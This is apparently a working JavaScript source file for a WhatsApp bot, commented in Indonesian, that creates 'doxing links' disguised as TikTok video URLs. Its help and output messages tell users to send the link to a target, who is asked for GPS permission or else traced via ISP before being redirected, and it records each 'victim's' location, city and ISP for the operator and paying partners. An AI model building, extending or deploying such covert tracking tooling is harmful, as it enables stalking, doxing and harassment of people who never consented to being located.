const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const P = require('pino');
const qrcode = require('qrcode-terminal');
const { connectDB, Partner, Link } = require('./config/database');
const crypto = require('crypto');
require('dotenv').config();

const logger = P({ level: 'silent' });
const OWNER_NUMBER = process.env.OWNER_NUMBER;
const VERCEL_URL = process.env.VERCEL_URL;

// Koneksi Database
connectDB();

// Fungsi generate ID unik
function generateUniqueId() {
    return crypto.randomBytes(8).toString('hex');
}

// Cek apakah user adalah owner
function isOwner(sender) {
    return sender.includes(OWNER_NUMBER);
}

// Cek apakah user adalah partner
async function isPartner(sender) {
    const number = sender.split('@')[0];
    const partner = await Partner.findOne({ number, isActive: true });
    return !!partner;
}

// Format nomor
function formatNumber(sender) {
    return sender.split('@')[0];
}

// Fungsi generate link doxing
async function generateDoxingLink(tiktokUrl, creator) {
    const uniqueId = generateUniqueId();
    
    // Encode TikTok URL
    const encodedUrl = Buffer.from(tiktokUrl).toString('base64');
    
    // Generate link
    const trackingLink = `${VERCEL_URL}/api/track?id=${uniqueId}&url=${encodedUrl}`;
    
    // Simpan ke database
    await Link.create({
        uniqueId,
        tiktokUrl,
        createdBy: creator.split('@')[0],
        victims: []
    });
    
    return { trackingLink, uniqueId };
}

// Mulai Bot
async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    
    const sock = makeWASocket({
        auth: state,
        logger,
        printQRInTerminal: true,
        browser: ['DOXTT BOT', 'Chrome', '2.0.0']
    });
    
    // QR Code
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr) {
            qrcode.generate(qr, { small: true });
            console.log('\n📱 SCAN QR INI DENGAN WHATSAPP OWNER!');
        }
        
        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect.error instanceof Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log('⚠️ Koneksi putus, reconnecting...');
            if (shouldReconnect) startBot();
        } else if (connection === 'open') {
            console.log('✅ BOT DOXTT SIAP!');
            console.log(`👑 OWNER: ${OWNER_NUMBER}`);
        }
    });
    
    // Handle Messages
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const m = messages[0];
        if (!m.message || m.key.fromMe) return;
        
        const sender = m.key.remoteJid;
        const text = m.message.conversation || m.message.extendedTextMessage?.text || '';
        
        // Skip kalo bukan pesan teks
        if (!text) return;
        
        const command = text.split(' ')[0].toLowerCase();
        const args = text.split(' ').slice(1);
        
        // CEK AKSES - Hanya Owner & Partner yang bisa pakai
        const isUserOwner = isOwner(sender);
        const isUserPartner = await isPartner(sender);
        
        if (!isUserOwner && !isUserPartner) {
            await sock.sendMessage(sender, { 
                text: `❌ *AKSES DITOLAK!*\n\nBot ini khusus untuk *OWNER* dan *PARTNER* saja.\n\n👑 Owner: 6285821652676\n📞 Hubungi owner untuk jadi partner.` 
            });
            return;
        }
        
        // ========== COMMAND HELP ==========
        if (command === '.help' || command === '.menu') {
            let menu = `🔥 *DOXTT BOT - PREMIUM* 🔥\n\n`;
            menu += `👑 Owner: MAMAT IBRAHIM\n`;
            menu += `📱 Nomor: 6285821652676\n`;
            menu += `👤 Status: ${isUserOwner ? 'OWNER' : 'PARTNER'}\n\n`;
            
            menu += `📌 *COMMANDS:*\n`;
            menu += `━━━━━━━━━━━━━━\n`;
            menu += `.doxtt [link_tiktok] - Buat link doxing\n`;
            menu += `.status [id] - Cek status link\n`;
            menu += `.listlink - Lihat semua link\n\n`;
            
            if (isUserOwner) {
                menu += `👑 *OWNER COMMANDS:*\n`;
                menu += `.addpartner [nomor] - Tambah partner\n`;
                menu += `.delpartner [nomor] - Hapus partner\n`;
                menu += `.listpartner - Lihat semua partner\n`;
            }
            
            menu += `\n⚠️ *Untuk keamanan & etika profesional!*`;
            
            await sock.sendMessage(sender, { text: menu });
        }
        
        // ========== COMMAND DOXTT ==========
        else if (command === '.doxtt') {
            const tiktokUrl = args[0];
            
            if (!tiktokUrl || !tiktokUrl.includes('tiktok.com')) {
                await sock.sendMessage(sender, {
                    text: `❌ *FORMAT SALAH!*\n\nGunakan: .doxtt [link_tiktok]\nContoh: .doxtt https://www.tiktok.com/@user/video/123456789`
                });
                return;
            }
            
            try {
                const { trackingLink, uniqueId } = await generateDoxingLink(tiktokUrl, sender);
                
                await sock.sendMessage(sender, {
                    text: `✅ *LINK DOXING BERHASIL!*\n\n` +
                          `🎯 *Target:* ${tiktokUrl}\n` +
                          `🔗 *Link:*\n${trackingLink}\n\n` +
                          `🆔 *ID:* ${uniqueId}\n\n` +
                          `📌 *CARA KERJA:*\n` +
                          `1. Kirim link ke target\n` +
                          `2. Target buka → minta izin lokasi\n` +
                          `3. ✅ Izin → Lokasi GPS akurat\n` +
                          `4. ❌ Tolak → Lacak via ISP\n` +
                          `5. Redirect ke video asli\n\n` +
                          `⏳ *Menunggu target membuka link...*`
                });
            } catch (error) {
                await sock.sendMessage(sender, {
                    text: `❌ *ERROR:* Gagal membuat link. Coba lagi.`
                });
            }
        }
        
        // ========== COMMAND STATUS ==========
        else if (command === '.status') {
            const uniqueId = args[0];
            
            if (!uniqueId) {
                await sock.sendMessage(sender, {
                    text: `❌ Masukkan ID link!\nContoh: .status abc123`
                });
                return;
            }
            
            const link = await Link.findOne({ uniqueId });
            
            if (!link) {
                await sock.sendMessage(sender, {
                    text: `❌ Link tidak ditemukan!`
                });
                return;
            }
            
            let statusMsg = `📊 *STATUS LINK:*\n\n`;
            statusMsg += `🆔 ID: ${link.uniqueId}\n`;
            statusMsg += `🎯 Target: ${link.tiktokUrl}\n`;
            statusMsg += `👀 Diklik: ${link.clicks} kali\n`;
            statusMsg += `🎯 Korban: ${link.victims.length} orang\n`;
            statusMsg += `📅 Dibuat: ${link.createdAt.toLocaleString('id-ID')}\n`;
            statusMsg += `👤 Creator: ${link.createdBy}\n\n`;
            
            if (link.victims.length > 0) {
                const last = link.victims[link.victims.length - 1];
                statusMsg += `📍 *Korban Terakhir:*\n`;
                statusMsg += `🗺️ Maps: ${last.googleMapsLink || '-'}\n`;
                if (last.city) statusMsg += `🏙️ Kota: ${last.city}, ${last.country}\n`;
                if (last.isp) statusMsg += `🌐 ISP: ${last.isp}\n`;
                statusMsg += `🕐 Waktu: ${new Date(last.timestamp).toLocaleString('id-ID')}`;
            }
            
            await sock.sendMessage(sender, { text: statusMsg });
        }
        
        // ========== COMMAND LISTLINK ==========
        else if (command === '.listlink') {
            const links = await Link.find({ createdBy: sender.split('@')[0] }).sort({ createdAt: -1 }).limit(10);
            
            if (links.length === 0) {
                await sock.sendMessage(sender, {
                    text: `📭 Kamu belum punya link doxing.`
                });
                return;
            }
            
            let listMsg = `📋 *LINK DOXING KAMU (10 terbaru):*\n\n`;
            
            links.forEach((link, i) => {
                listMsg += `${i+1}. 🆔 ${link.uniqueId}\n`;
                listMsg += `   🎯 ${link.tiktokUrl.substring(0, 30)}...\n`;
                listMsg += `   👀 ${link.clicks}x | 🎯 ${link.victims.length} korban\n`;
                listMsg += `   📅 ${link.createdAt.toLocaleDateString('id-ID')}\n\n`;
            });
            
            await sock.sendMessage(sender, { text: listMsg });
        }
        
        // ========== OWNER COMMANDS ==========
        else if (isUserOwner) {
            
            // Command ADD PARTNER
            if (command === '.addpartner') {
                const partnerNumber = args[0]?.replace(/[^0-9]/g, '');
                
                if (!partnerNumber || partnerNumber.length < 10) {
                    await sock.sendMessage(sender, {
                        text: `❌ Format salah!\nGunakan: .addpartner 62812xxxxxx`
                    });
                    return;
                }
                
                try {
                    // Cek udah ada belum
                    const existing = await Partner.findOne({ number: partnerNumber });
                    
                    if (existing) {
                        if (existing.isActive) {
                            await sock.sendMessage(sender, {
                                text: `⚠️ Nomor ${partnerNumber} sudah menjadi partner!`
                            });
                        } else {
                            existing.isActive = true;
                            await existing.save();
                            await sock.sendMessage(sender, {
                                text: `✅ Partner ${partnerNumber} diaktifkan kembali!`
                            });
                        }
                    } else {
                        await Partner.create({
                            number: partnerNumber,
                            name: `Partner_${partnerNumber.slice(-4)}`,
                            addedBy: OWNER_NUMBER
                        });
                        
                        await sock.sendMessage(sender, {
                            text: `✅ *BERHASIL TAMBAH PARTNER!*\n\n📱 Nomor: ${partnerNumber}\n👑 Ditambah oleh: OWNER\n\nSekarang partner bisa menggunakan bot.`
                        });
                    }
                } catch (error) {
                    await sock.sendMessage(sender, {
                        text: `❌ Error: ${error.message}`
                    });
                }
            }
            
            // Command DELETE PARTNER
            else if (command === '.delpartner') {
                const partnerNumber = args[0]?.replace(/[^0-9]/g, '');
                
                if (!partnerNumber) {
                    await sock.sendMessage(sender, {
                        text: `❌ Masukkan nomor partner!\nGunakan: .delpartner 62812xxxxxx`
                    });
                    return;
                }
                
                const partner = await Partner.findOne({ number: partnerNumber });
                
                if (!partner) {
                    await sock.sendMessage(sender, {
                        text: `❌ Nomor ${partnerNumber} bukan partner.`
                    });
                    return;
                }
                
                partner.isActive = false;
                await partner.save();
                
                await sock.sendMessage(sender, {
                    text: `✅ Partner ${partnerNumber} telah dihapus.`
                });
            }
            
            // Command LIST PARTNER
            else if (command === '.listpartner') {
                const partners = await Partner.find({ isActive: true });
                
                if (partners.length === 0) {
                    await sock.sendMessage(sender, {
                        text: `📭 Belum ada partner.`
                    });
                    return;
                }
                
                let listMsg = `👥 *DAFTAR PARTNER AKTIF:*\n\n`;
                
                partners.forEach((p, i) => {
                    listMsg += `${i+1}. 📱 ${p.number}\n`;
                    listMsg += `   👤 ${p.name}\n`;
                    listMsg += `   📅 ${p.addedAt.toLocaleDateString('id-ID')}\n\n`;
                });
                
                await sock.sendMessage(sender, { text: listMsg });
            }
        }
    });
    
    // Save credentials
    sock.ev.on('creds.update', saveCreds);
}

// Jalankan bot
startBot().catch(console.error);